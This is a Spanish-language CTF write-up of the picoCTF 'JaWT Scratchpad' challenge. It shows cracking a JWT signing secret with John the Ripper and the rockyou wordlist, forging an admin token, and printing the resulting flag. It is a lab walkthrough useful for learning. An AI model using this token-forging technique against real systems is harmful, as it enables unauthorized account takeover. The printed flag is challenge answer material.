# JaWT Scratchpad

## Objetivo.

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

## Solución.

Logeamos a la pagina con el usuario Luis
La página nos regresa un token de usuario válido

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww

ingresamos a la página jwt.io
para cambiar la cookie, en el nombre de usuario cambiamos el nombre de Luis a admin

En kali pegamos el token de la cookie
┌──(kali㉿kali)-[~]
└─$ nano eltoken 
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat eltoken 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww
                                                                             
┌──(kali㉿kali)-[~]
└─$ john         
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.

Luego ingresamos a la ruta usr/share/wordlists y descomprimimos el archivo rockyou.txt.gz

┌──(kali㉿kali)-[~]
└─$ /usr/share/wordlists
                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ la    
amass      fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirb       fern-wifi      metasploit  sqlmap.txt
dirbuster  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ gzip -d rockyou.txt.gz 
gzip: rockyou.txt: Permission denied
                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt.gz
[sudo] password for kali: 

┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls    
amass  dirb  dirbuster  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt  sqlmap.txt  wfuzz  wifite.txt

Ahora regresamos a la carpeta usuario
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ cd         
                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ ls
Desktop  Documents  Downloads  el  eltoken  hacking  Music  Pictures  Public  Templates  Videos
                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ john eltoken -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico
0g 0:00:00:13 DONE (2023-03-14 11:34) 0g/s 1090Kp/s 1090Kc/s 1090KC/s !)(OPPQR..*7¡Vamos!
Session completed. 

con john obtenemos la siguiente palabra **ilovepico**

esa palabra la cambiamos en verify signature y cambiamos la cookie 
Si guardamos esa cookie y refrescamos obtenemos la bandera

picoCTF{jawt_was_just_what_you_thought_1ca14548}

## Notas opcionales.

## Referencias.

https://jwt.io/